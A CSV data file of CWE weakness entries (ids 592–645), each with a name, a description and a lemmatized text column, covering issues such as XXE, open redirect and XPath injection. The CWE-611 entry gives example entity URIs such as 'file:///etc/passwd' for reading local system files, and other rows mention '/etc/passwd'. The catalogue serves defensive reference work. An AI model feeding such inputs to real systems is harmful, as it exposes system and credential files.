id,name,description,processed
CWE-592,DEPRECATED: Authentication Bypass Issues,This weakness has been deprecated because it covered redundant concepts already described in CWE-287.,weakness deprecate cover redundant concept describe
CWE-593,Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created,"The product modifies the SSL context after connection creation has begun.If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.",product modify ssl context connection creation begin program modify object create ssl object possibility old ssl object create original context affect change
CWE-594,J2EE Framework: Saving Unserializable Objects to Disk,"When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.In heavy load conditions, most J2EE application frameworks flush objects to disk to manage memory requirements of incoming requests. For example, session scoped objects, and even application scoped objects, are written to disk when required. While these application frameworks do the real work of writing objects to disk, they do not enforce that those objects be serializable, thus leaving the web application vulnerable to crashes induced by serialization failure. An attacker may be able to mount a denial of service attack by sending enough requests to the server to force the web application to save objects to disk.",container attempt write unserializable object disk guarantee process complete successfully heavy load condition application framework flush object disk manage memory requirement incoming request example session scope object application scope object write disk require application framework real work write object disk enforce object serializable leave web application vulnerable crash induce serialization failure attacker able mount denial service attack send request server force web application save object disk
CWE-595,Comparison of Object References Instead of Object Contents,"The product compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.For example, in Java, comparing objects using == usually produces deceptive results, since the == operator compares object references rather than values; often, this means that using == for strings is actually comparing the strings' references, not their values.",product compare object reference instead content object prevent detect equivalent object example java compare object usually produce deceptive result operator compare object reference value mean string actually compare string reference value
CWE-596,DEPRECATED: Incorrect Semantic Object Comparison,This weakness has been deprecated. It was poorly described and difficult to distinguish from other entries. It was also inappropriate to assign a separate ID solely because of domain-specific considerations. Its closest equivalent is CWE-1023.,weakness deprecate poorly describe difficult distinguish entry inappropriate assign separate id solely domain specific consideration close equivalent
CWE-597,Use of Wrong Operator in String Comparison,"The product uses the wrong operator when comparing a string, such as using ""=="" when the .equals() method should be used instead.In Java, using == or != to compare two strings for equality actually compares two objects for equality rather than their string values for equality. Chances are good that the two references will never be equal. While this weakness often only affects program correctness, if the equality is used for a security decision, the unintended comparison result could be leveraged to affect program security.",product use wrong operator compare string method instead java compare string equality actually compare object equality string value equality chance good reference equal weakness affect program correctness equality security decision unintended comparison result leverage affect program security
CWE-598,Use of GET Request Method With Sensitive Query Strings,"The web application uses the HTTP GET method to process a request and includes sensitive information in the query string of that request.The query string for the URL could be saved in the browser's history, passed through Referers to other web sites, stored in web logs, or otherwise recorded in other sources. If the query string contains sensitive information such as session identifiers, then attackers can use this information to launch further attacks.",web application use http method process request include sensitive information query string request query string url save browser history pass referer web site store web log record source query string contain sensitive information session identifier attacker use information launch attack
CWE-599,Missing Validation of OpenSSL Certificate,"The product uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated.",product use openssl trust use certificate function ensure certificate satisfy necessary security requirement allow attacker use invalid certificate claim trusted host use expired certificate conduct attack detect certificate properly validate
CWE-6,J2EE Misconfiguration: Insufficient Session-ID Length,"The J2EE application is configured to use an insufficient session ID length.If an attacker can guess or steal a session ID, then they may be able to take over the user's session (called session hijacking). The number of possible session IDs increases with increased session ID length, making it more difficult to guess or steal a session ID.",application configure use insufficient session id length attacker guess steal session id able user session call session hijacking number possible session id increase increase session id length make difficult guess steal session id
CWE-600,Uncaught Exception in Servlet ,"The Servlet does not catch all exceptions, which may reveal sensitive debugging information.When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.",servlet catch exception reveal sensitive debugging information servlet throw exception default error response servlet container send user typically include debug information information great value attacker example stack trace attacker malformed sql query string type database version application container information enable attacker target know vulnerability component
CWE-601,URL Redirection to Untrusted Site ('Open Redirect'),"A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.",web application accept user control input specify link external site use link redirect simplify phishing attack http parameter contain url value cause web application redirect request specify url modify url value malicious site attacker successfully launch phishing scam steal user credential server modify link identical original site phishing attempt trustworthy appearance issue pose vulnerability subject intended behavior application example search engine intentionally provide redirect arbitrary url
CWE-602,Client-Side Enforcement of Server-Side Security,"The product is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms, resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.",product compose server rely client implement mechanism intend protect server server rely protection mechanism place client attacker modify client behavior bypass protection mechanism result potentially unexpected interaction client server consequence vary depend mechanism try protect
CWE-603,Use of Client-Side Authentication,"A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.",client server product perform authentication client code server code allow server authentication bypass modify client omit authentication check client authentication extremely weak breach easily attacker read source code reverse engineer authentication mechanism access part application protect
CWE-605,Multiple Binds to the Same Port,"When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.On most systems, a combination of setting the SO_REUSEADDR socket option, and a call to bind() allows any process to bind to a port to which a previous process has bound with INADDR_ANY. This allows a user to bind to the specific address of a server bound to INADDR_ANY on an unprivileged port, and steal its UDP packets/TCP connection.",multiple socket allow bind port service port steal spoof system combination set socket option bind allow process bind port previous process bind allow user bind specific address server bind unprivileged port steal udp packet tcp connection
CWE-606,Unchecked Input for Loop Condition,"The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service or other consequences because of excessive looping.",product properly check input loop condition potentially lead denial service consequence excessive looping
CWE-607,Public Static Final Field References Mutable Object,"A public or protected static final field references a mutable object, which allows the object to be changed by malicious code, or accidentally from another package.",public protect static final field reference mutable object allow object change malicious code accidentally package
CWE-608,Struts: Non-private Field in ActionForm Class,"An ActionForm class contains a field that has not been declared private, which can be accessed without using a setter or getter.",actionform class contain field declare private access setter getter
CWE-609,Double-Checked Locking,"The product uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.Double-checked locking refers to the situation where a programmer checks to see if a resource has been initialized, grabs a lock, checks again to see if the resource has been initialized, and then performs the initialization if it has not occurred yet. This should not be done, as it is not guaranteed to work in all languages and on all architectures. In summary, other threads may not be operating inside the synchronous block and are not guaranteed to see the operations execute in the same order as they would appear inside the synchronous block.",product use double check locking access resource overhead explicit synchronization locking insufficient double checked locking refer situation programmer check resource initialize grab lock check resource initialize perform initialization occur guarantee work language architecture summary thread operate inside synchronous block guarantee operation execute order appear inside synchronous block
CWE-61,UNIX Symbolic Link (Symlink) Following,"The product, when opening a file or directory, does not sufficiently account for when the file is a symbolic link that resolves to a target outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.A product that allows UNIX symbolic links (symlink) as part of paths whether in internal code or through user input can allow an attacker to spoof the symbolic link and traverse the file system to unintended locations or access arbitrary files. The symbolic link can permit an attacker to read/write/corrupt a file that they originally did not have permissions to access.",product open file directory sufficiently account file symbolic link resolve target outside intended control sphere allow attacker cause product operate unauthorized file product allow unix symbolic link symlink path internal code user input allow attacker spoof symbolic link traverse file system unintended location access arbitrary file symbolic link permit attacker read write corrupt file originally permission access
CWE-610,Externally Controlled Reference to a Resource in Another Sphere,The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.,product use externally control reference resolve resource outside intended control sphere
CWE-611,Improper Restriction of XML External Entity Reference,"The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as ""file:///c:/winnt/win.ini"" designates (in Windows) the file C:\Winnt\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.",product process xml document contain xml entity uri resolve document outside intended sphere control cause product embed incorrect document output xml document optionally contain document type definition dtd feature enable definition xml entity possible define entity provide substitution string form uri xml parser access content uri embed content xml document processing submit xml file define external entity uri attacker cause processing application read content local file example uri designate windows file passwd designate password file unix base system uri scheme attacker force application outgoing request server attacker reach directly bypass firewall restriction hide source attack port scanning content uri read feed application process xml application echo datum error message expose file content
CWE-612,Improper Authorization of Index Containing Sensitive Information,"The product creates a search index of private or sensitive documents, but it does not properly limit index access to actors who are authorized to see the original information.Web sites and other document repositories may apply an indexing routine against a group of private documents to facilitate search. If the index's results are available to parties who do not have access to the documents being indexed, then attackers could obtain portions of the documents by conducting targeted searches and reading the results. The risk is especially dangerous if search results include surrounding text that was not part of the search query. This issue can appear in search engines that are not configured (or implemented) to ignore critical files that should remain hidden; even without permissions to download these files directly, the remote user could read them.",product create search index private sensitive document properly limit index access actor authorize original information web site document repository apply indexing routine group private document facilitate search index result available party access document index attacker obtain portion document conduct target search read result risk especially dangerous search result include surround text search query issue appear search engine configure implement ignore critical file remain hidden permission download file directly remote user read
CWE-613,Insufficient Session Expiration,"According to WASC, ""Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.""",accord wasc insufficient session expiration web site permit attacker reuse old session credential session id authorization
CWE-614,Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,"The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.",secure attribute sensitive cookie https session set cause user agent send cookie plaintext http session
CWE-615,Inclusion of Sensitive Information in Source Code Comments,"While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.An attacker who finds these comments can map the application's structure and files, expose hidden parts of the site, and study the fragments of code to reverse engineer the application, which may help develop further attacks against the site.",add general comment useful programmer tend leave important datum filename relate web application old link link mean browse user old code fragment etc attacker find comment map application structure file expose hidden part site study fragment code reverse engineer application help develop attack site
CWE-616,Incomplete Identification of Uploaded File Variables (PHP),"The PHP application uses an old method for processing uploaded files by referencing the four global variables that are set for each file (e.g. $varname, $varname_size, $varname_name, $varname_type). These variables could be overwritten by attackers, causing the application to process unauthorized files.These global variables could be overwritten by POST requests, cookies, or other methods of populating or overwriting these variables. This could be used to read or process arbitrary files by providing values such as ""/etc/passwd"".",php application use old method process upload file reference global variable set file varname variable overwrite attacker cause application process unauthorized file global variable overwrite post request cookie method populate overwrite variable read process arbitrary file provide value passwd
CWE-617,Reachable Assertion,"The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.While assertion is good for catching logic errors and reducing the chances of reaching more serious vulnerability conditions, it can still lead to a denial of service.For example, if a server handles multiple simultaneous connections, and an assert() occurs in one single connection that causes all other connections to be dropped, this is a reachable assertion that leads to a denial of service.",product contain assert similar statement trigger attacker lead application exit behavior severe necessary assertion good catch logic error reduce chance reach vulnerability condition lead denial service example server handle multiple simultaneous connection assert occur single connection cause connection drop reachable assertion lead denial service
CWE-618,Exposed Unsafe ActiveX Method,"An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).ActiveX controls can exercise far greater control over the operating system than typical Java or javascript. Exposed methods can be subject to various vulnerabilities, depending on the implemented behaviors of those methods, and whether input validation is performed on the provided arguments. If there is no integrity checking or origin validation, this method could be invoked by attackers.",activex control intend use web browser expose dangerous method perform action outside browser security model zone control exercise far great control operate system typical java javascript expose method subject vulnerability depend implement behavior method input validation perform provide argument integrity checking origin validation method invoke attacker
CWE-619,Dangling Database Cursor ('Cursor Injection'),"If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor ""dangling.""For example, an improper dangling cursor could arise from unhandled exceptions. The impact of the issue depends on the cursor's role, but SQL injection attacks are commonly possible.",database cursor close properly accessible user retain privilege originally assign leave cursor dangle example improper dangle cursor arise unhandled exception impact issue depend cursor role sql injection attack commonly possible
CWE-62,UNIX Hard Link,"The product, when opening a file or directory, does not sufficiently account for when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. /etc/passwd). When the process opens the file, the attacker can assume the privileges of that process.",product open file directory sufficiently account associate hard link target outside intended control sphere allow attacker cause product operate unauthorized file failure system check hard link result vulnerability different type attack example attacker escalate privilege file privileged program replace hard link sensitive file passwd process open file attacker assume privilege process
CWE-620,Unverified Password Change,"When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.",set new password user product require knowledge original password form authentication attacker change password user gain privilege associate user
CWE-621,Variable Extraction Error,"The product uses external input to determine the names of variables into which information is extracted, without verifying that the names of the specified variables are valid. This could cause the program to overwrite unintended variables.For example, in PHP, extraction can be used to provide functionality similar to register_globals, a dangerous functionality that is frequently disabled in production systems. Calling extract() or import_request_variables() without the proper arguments could allow arbitrary global variables to be overwritten, including superglobals.Similar functionality is possible in other interpreted languages, including custom languages.",product use external input determine name variable information extract verify name specify variable valid cause program overwrite unintended variable example php extraction provide functionality similar dangerous functionality frequently disable production system call extract proper argument allow arbitrary global variable overwrite include superglobal similar functionality possible interpret language include custom language
CWE-622,Improper Validation of Function Hook Arguments,"The product adds hooks to user-accessible API functions, but it does not properly validate the arguments. This could lead to resultant vulnerabilities.Such hooks can be used in defensive software that runs with privileges, such as anti-virus or firewall, which hooks kernel calls. When the arguments are not validated, they could be used to bypass the protection scheme or attack the product itself.",product add hook user accessible api function properly validate argument lead resultant vulnerability hook defensive software run privilege anti virus firewall hook kernel call argument validate bypass protection scheme attack product
CWE-623,Unsafe ActiveX Control Marked Safe For Scripting,"An ActiveX control is intended for restricted use, but it has been marked as safe-for-scripting.This might allow attackers to use dangerous functionality via a web page that accesses the control, which can lead to different resultant vulnerabilities, depending on the control's behavior.",activex control intend restricted use mark safe scripting allow attacker use dangerous functionality web page access control lead different resultant vulnerability depend control behavior
CWE-624,Executable Regular Expression Error,"The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.Case (2) is possible in the PHP preg_replace() function, and possibly in other languages when a user-controlled input is inserted into a string that is later parsed as a regular expression.",product use regular expression contain executable component user control input allow user enable execution insert pattern modifier case possible php function possibly language user control input insert string later parse regular expression
CWE-625,Permissive Regular Expression,"The product uses a regular expression that does not sufficiently restrict the set of allowed values.This effectively causes the regexp to accept substrings that match the pattern, which produces a partial comparison to the target. In some cases, this can lead to other weaknesses. Common errors include:not identifying the beginning and end of the target stringusing wildcards instead of acceptable character rangesothers",product use regular expression sufficiently restrict set allow value effectively cause regexp accept substring match pattern produce partial comparison target case lead weakness common error include identify beginning end target stringuse wildcard instead acceptable character rangesother
CWE-626,Null Byte Interaction Error (Poison Null Byte),"The product does not properly handle null bytes or NUL characters when passing data between different representations or components.A null byte (NUL character) can have different meanings across representations or languages. For example, it is a string terminator in standard C libraries, but Perl and PHP strings do not treat it as a terminator. When two representations are crossed - such as when Perl or PHP invokes underlying C functionality - this can produce an interaction error with unexpected results. Similar issues have been reported for ASP. Other interpreters written in C might also be affected.The poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename. It can play a role in regular expression processing in PHP.",product properly handle null byte nul character pass datum different representation component null byte nul character different meaning representation language example string terminator standard c library perl php string treat terminator representation cross perl php invoke underlie c functionality produce interaction error unexpected result similar issue report asp interpreter write c affect poison null byte frequently useful path traversal attack terminate hard code extension add filename play role regular expression processing php
CWE-627,Dynamic Variable Evaluation,"In a language where the user can influence the name of a variable at runtime, if the variable names are not controlled, an attacker can read or write to arbitrary variables, or access arbitrary functions.The resultant vulnerabilities depend on the behavior of the application, both at the crossover point and in any control/data flow that is reachable by the related variables or functions.",language user influence variable runtime variable name control attacker read write arbitrary variable access arbitrary function resultant vulnerability depend behavior application crossover point control data flow reachable related variable function
CWE-628,Function Call with Incorrectly Specified Arguments,"The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.There are multiple ways in which this weakness can be introduced, including:the wrong variable or reference;an incorrect number of arguments;incorrect order of arguments;wrong type of arguments; orwrong value.",product call function procedure routine argument correctly specify lead incorrect behavior resultant weakness multiple way weakness introduce include wrong variable incorrect number order type argument orwrong value
CWE-636,Not Failing Securely ('Failing Open'),"When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.By entering a less secure state, the product inherits the weaknesses associated with that state, making it easier to compromise. At the least, it causes administrators to have a false sense of security. This weakness typically occurs as a result of wanting to ""fail functional"" to minimize administration and support costs, instead of ""failing safe.""",product encounter error condition failure design require fall state secure option available select weak encryption algorithm permissive access control restriction enter secure state product inherit weakness associate state make easy compromise cause administrator false sense security weakness typically occur result want fail functional minimize administration support cost instead fail safe
CWE-637,Unnecessary Complexity in Protection Mechanism (Not Using 'Economy of Mechanism'),"The product uses a more complex mechanism than necessary, which could lead to resultant weaknesses when the mechanism is not correctly understood, modeled, configured, implemented, or used.Security mechanisms should be as simple as possible. Complex security mechanisms may engender partial implementations and compatibility problems, with resulting mismatches in assumptions and implemented security. A corollary of this principle is that data specifications should be as simple as possible, because complex data specifications result in complex validation code. Complex tasks and systems may also need to be guarded by complex security checks, so simple systems should be preferred.",product use complex mechanism necessary lead resultant weakness mechanism correctly understand model configure implement security mechanism simple possible complex security mechanism engender partial implementation compatibility problem result mismatch assumption implement security corollary principle datum specification simple possible complex datum specification result complex validation code complex task system need guard complex security check simple system prefer
CWE-638,Not Using Complete Mediation,"The product does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.",product perform access check resource time resource access entity create resultant weakness entity right privilege change time
CWE-639,Authorization Bypass Through User-Controlled Key,"The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.",system authorization functionality prevent user gain access user datum record modify key value identify datum retrieval user record occur system base key value user control key typically identify user relate record store system lookup record presentation user likely attacker authenticated user system authorization process properly check datum access operation ensure authenticate user perform operation sufficient entitlement perform request datum access bypass authorization check present system example attacker look place user specific datum retrieve search screen determine key item look controllable externally key hidden field html form field pass url parameter unencrypted cookie variable case possible tamper key value manifestation weakness system use sequential easily guessable session id allow user easily switch user session read modify datum
CWE-64,Windows Shortcut Following (.LNK),"The product, when opening a file or directory, does not sufficiently handle when the file is a Windows shortcut (.LNK) whose target is outside of the intended control sphere. This could allow an attacker to cause the product to operate on unauthorized files.The shortcut (file with the .lnk extension) can permit an attacker to read/write a file that they originally did not have permissions to access.",product open file directory sufficiently handle file windows shortcut target outside intended control sphere allow attacker cause product operate unauthorized file shortcut file extension permit attacker read write file originally permission access
CWE-640,Weak Password Recovery Mechanism for Forgotten Password,"The product contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account. Weak password recovery schemes completely undermine a strong password authentication scheme.This weakness may be that the security question is too easy to guess or find an answer to (e.g. because the question is too common, or the answers can be found using social media). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system.",product contain mechanism user recover change password know original password mechanism weak common application mechanism provide means user gain access account event forget password password recovery mechanism weak effect make likely possible person legitimate system user gain access user account weak password recovery scheme completely undermine strong password authentication scheme weakness security question easy guess find answer question common answer find social medium implementation weakness password recovery mechanism code instance trick system e mail new password e mail account user throttling rate password reset legitimate user deny service attacker attacker try recover password rapid succession system send original password user generate new temporary password summary password recovery functionality carefully design implement system weak link misuse way allow attacker gain unauthorized access system
CWE-641,Improper Restriction of Names for Files and Other Resources,"The product constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.",product construct file resource input upstream component restrict incorrectly restrict result produce resultant weakness instance name resource contain scripting character possible script execute client browser application display resource dynamically generate web page alternately resource consume application parser specially craft exploit vulnerability internal parser potentially result execution arbitrary code server machine problem vary base context usage malformed resource name vulnerability present assumption target technology code execution possible
CWE-642,External Control of Critical State Data,"The product stores security-critical state information about its users, or the product itself, in a location that is accessible to unauthorized actors.If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an ""authenticated=true"" cookie. An attacker may simply create this cookie in order to bypass the authentication.",product store security critical state information user product location accessible unauthorized actor attacker modify state information detection perform unauthorized action access unexpected resource application programmer expect state change state information store location cookie hidden web form field input parameter argument environment variable database record setting file etc location potential modify attacker state information control security determine resource usage create vulnerability example application perform authentication save state authenticate true cookie attacker simply create cookie order bypass authentication
CWE-643,Improper Neutralization of Data within XPath Expressions ('XPath Injection'),"The product uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).",product use external input dynamically construct xpath expression retrieve datum xml database neutralize incorrectly neutralize input allow attacker control structure query net effect attacker control information select xml database use ability control application flow modify logic retrieve unauthorized datum bypass important check authentication
CWE-644,Improper Neutralization of HTTP Headers for Scripting Syntax,"The product does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.An attacker may be able to conduct cross-site scripting and other attacks against users who have these components enabled.If a product does not neutralize user controlled data being placed in the header of an HTTP response coming from the server, the header may contain a script that will get executed in the client's browser context, potentially resulting in a cross site scripting vulnerability or possibly an HTTP response splitting attack. It is important to carefully control data that is being placed both in HTTP response header and in the HTTP response body to ensure that no scripting syntax is present, taking various encodings into account.",product neutralize incorrectly neutralize web scripting syntax http header web browser component process raw header flash attacker able conduct cross site scripting attack user component enable product neutralize user control datum place header http response come server header contain script execute client browser context potentially result cross site scripting vulnerability possibly http response splitting attack important carefully control datum place http response header http response body ensure scripting syntax present take encoding account
CWE-645,Overly Restrictive Account Lockout Mechanism,"The product contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.",product contain account lockout protection mechanism mechanism restrictive trigger easily allow attacker deny service legitimate user cause account lock account lockout security feature present application countermeasure brute force attack password base authentication mechanism system certain number fail login attempt user account disable certain period time unlock administrator security event possibly trigger account lockout attacker use security feature deny service legitimate system user important ensure account lockout security mechanism overly restrictive
